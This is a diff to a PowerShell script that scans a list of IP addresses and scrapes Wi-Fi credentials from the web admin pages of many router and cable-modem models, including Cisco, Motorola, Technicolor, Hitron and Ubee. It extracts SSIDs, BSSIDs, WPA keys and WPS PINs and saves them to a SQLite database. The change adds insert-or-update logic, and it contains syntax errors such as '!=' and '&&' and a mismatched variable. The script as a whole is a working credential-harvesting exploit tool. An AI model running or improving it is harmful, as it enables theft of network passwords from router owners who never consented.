@@ -6,6 +6,8 @@ $IPs_LIST_PATH = "$ACTUAL_PATH\NATIp.txt";
 $IPs_FAILED = "$ACTUAL_PATH\Fail.txt";
 $DATABASE = "$ACTUAL_PATH\Router.db";
 $queryInsert = "INSERT INTO ROUTER (IP,BSSID,SSID,PASSWORD,LAST_UPDATE) VALUES (@IP,@BSSID,@SSID,@PASSWORD,@LAST_UPDATE)";
+$querySelect = "SELECT * FROM ROUTER WHERE BSSID LIKE @BSSID";
+$queryUpdate = "UPDATE ROUTER SET IP = @IP, BSSID = @BSSID, SSID = @SSID, PASSWORD = @PASSWORD, LAST_UPDATE = @LAST_UPDATE WHERE idRouter = @ID"
 
     $Query = "CREATE TABLE ROUTER (
   idRouter INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -27,15 +29,64 @@ function insert{
 		[string]$PASSWORD = $null
     )
 
-    Invoke-SqliteQuery -DataSource $Database -Query $queryInsert -SqlParameters @{
-        IP = $IP
-		BSSID = $BSSID.ToUpper()
-        SSID = $SSID
-		PASSWORD = $PASSWORD
-        LAST_UPDATE  = (get-date)
-    }
+	if($IP!=$null && $BSSID !=$null){
+		Invoke-SqliteQuery -DataSource $Database -Query $queryInsert 
+			-SqlParameters @{
+				IP = $IP
+				BSSID = $BSSID.ToUpper()
+				SSID = $SSID
+				PASSWORD = $PASSWORD
+				LAST_UPDATE  = (get-date)
+			}
+	}else{
+		Write-Output "Cant insert. IP or BSSID are null"
+	}
+    
+}
+
+function update{
+	Param (
+        [Parameter(ValueFromPipeline=$true)]
+        [string]$IP = $null,
+        [string]$BSSID = $null,
+		[string]$SSID = $null,
+		[string]$PASSWORD = $null,
+		[string]$ID = $null
+    )
+	if($ID!=$null){
+		 Invoke-SqliteQuery -DataSource $Database -Query $queryUpdate 
+			-SqlParameters @{
+				IP = $IP
+				BSSID = $BSSID.ToUpper()
+				SSID = $SSID
+				PASSWORD = $PASSWORD
+				LAST_UPDATE  = (get-date)
+				ID = $ID
+			}
+	}else{
+		Write-Output "Cant update $BSSID. ID is null"
+	}
+}
+
+function insertOrUpdate{
+	Param (
+        [Parameter(ValueFromPipeline=$true)]
+        [string]$IP = $null,
+        [string]$BSSID = $null,
+		[string]$SSID = $null,
+		[string]$PASSWORD = $null
+    )
+
+	$result = Invoke-SqliteQuery -DataSource $Database -Query $querySelect -SqlParameters @{BSSID = $BSSID.ToUpper()}
+	
+	if([string]::IsNullOrEmpty($result)){
+		insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+	}else{
+		update -IP $IP -BSSID $BSSID -SSID $SSID -PASSWORD $PASS -ID $result.idRouter
+	}
 
 }
+
 
 function verifyFile(){
 	if([System.IO.File]::Exists($save)){
@@ -151,10 +202,10 @@ function techTom($ip){
 
 			if(!($PASS -like '*0000000000*')){
 				"$BSSID - $PASS"
-				insert -IP $ip -BSSID $BSSID -PASSWORD $PASS
+				insertOrUpdate -IP $ip -BSSID $BSSID -PASSWORD $PASS
 			}else{
 				$BSSID
-				insert -IP $ip -BSSID $BSSID
+				insertOrUpdate -IP $ip -BSSID $BSSID
 			}
 			
 			
@@ -187,9 +238,9 @@ function cisco($ip){
 				$ciscoPass = Get-Content $ciscoPassword
 				$PASS = (($ciscoPass -match 'name="*wifi0_wpaPsk_key"* size="*32"* maxlength="*64"* value="*' ) -split 'value=')[1].split('"')[1]
 				"$SSID - $BSSID - $PASS"
-				insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+				insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 			}else{
-				insert -IP $ip -BSSID $BSSID -SSID $SSID
+				insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID
 			}
 		}
 		Remove-Item $cookie;
@@ -216,7 +267,7 @@ function wan($ip){
 			$PASS = ($wan | Select-String -Pattern 'wl0_wpa_psk=.*').Line.replace('wl0_wpa_psk=','')
 			$PIN = ($wan | Select-String -Pattern 'wps_device_pin=.*').Line.replace('wps_device_pin=','')
 			"$SSID - $BSSID - $PASS"
-			insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+			insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 		}catch{
 			if($wan -like '*Started Unicast Maintenance Ranging*'){
 				Remove-Item $save
@@ -240,13 +291,13 @@ function motorola($ip){
 			$BSSID = ($motorola -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('()')[1].ToUpper()
 			$PASS = (($motorola -match ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
 			"$BSSID - $PASS"
-			insert -IP $ip -BSSID $BSSID -PASSWORD $PASS
+			insertOrUpdate -IP $ip -BSSID $BSSID -PASSWORD $PASS
 		}else{
 			$BSSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[1].Trim()
 			$SSID = ($motorola -match 'colspan=2 bgcolor=#E7DAAC>.*').split('()')[0].replace('<tr><td align=middle valign=top colspan=2 bgcolor=#E7DAAC>','').Trim()
 			$PASS = (($motorola -match 'size=32 maxlength=64 value=".*"') -split 'value="' -split '"></tr><tr>')[1]
 			"$BSSID - $SSID - $PASS"
-			insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+			insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 		}
 	}
 }
@@ -265,7 +316,7 @@ function motorolasbg($ip){
 		$SSID = ([Regex]::new('"Wireless.Status.essid",\s+".*"').Matches($sbg).value -split '",')[1].Trim().replace('"','')
 		$BSSID = ($sbg -match '([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}').split('"')[1]
 		"$SSID - $BSSID - $PASS"
-		insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+		insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
     }
 }
 
@@ -303,7 +354,7 @@ function ciscoDPC2420($ip){
 				#	"$SSID - $BSSID - $PASS"
 				#}
 				"$SSID - $BSSID"
-				insert -IP $ip -BSSID $BSSID -SSID $SSID
+				insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID
 			}
 		}
 		
@@ -329,7 +380,7 @@ function techCGA0101($ip){
 		$BSSID = $json.BSSID.replace("`r`n","")
 		$PASS = $json.KeyPassphrase.replace("`r`n","")
 		"$SSID - $BSSID - $PASS"
-		insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+		insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 	}
 }
 
@@ -347,12 +398,12 @@ function techDPC3928SL2($ip){
 			if((Invoke-WebRequest -Uri "http://$ip/WSecurity.asp" -Headers @{"Upgrade-Insecure-Requests"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "DNT"="1"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"}).Content -match 'size="25" maxlength="64" value=".*'){
 				$PASS = $Matches[0].replace('size="25" maxlength="64" value="','').split('"')[0]
 				"$BSSID - $SSID - $PASS"
-				insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+				insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 			}else{
-				insert -IP $ip -BSSID $BSSID -SSID $SSID
+				insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID
 			}
 		}else{
-			insert -IP $ip -BSSID $BSSID
+			insertOrUpdate -IP $ip -BSSID $BSSID
 		}
 	}	
 	
@@ -371,7 +422,7 @@ function hitron($ip){
 		$BSSID = ($hitron -match 'ra0       Link encap:Ethernet  HWaddr .*' -split 'HWaddr ')[1]
 		$PASS = ($hitron -match 'wpa key is:.*' -split ': ')[1]
 		"$BSSID - $PASS"
-		insert -IP $ip -BSSID $BSSID -PASSWORD $PASS
+		insertOrUpdate -IP $ip -BSSID $BSSID -PASSWORD $PASS
 	}	
 }
 
@@ -389,7 +440,7 @@ function ubee($ip){
 		$BSSID = ($ubee | Select-String -Pattern  '([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})').split('()')[1].Trim()
 		$PASS = (($ubee | Select-String -Pattern  ('name="WpaPreSharedKey" size="*32"* maxlength="*64"* value=".*"')) -split 'value="')[1].split('"')[0]
 		"$BSSID - $SSID - $PASS"
-		insert -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
+		insertOrUpdate -IP $ip -BSSID $BSSID -SSID $SSID -PASSWORD $PASS
 	}
 }
 
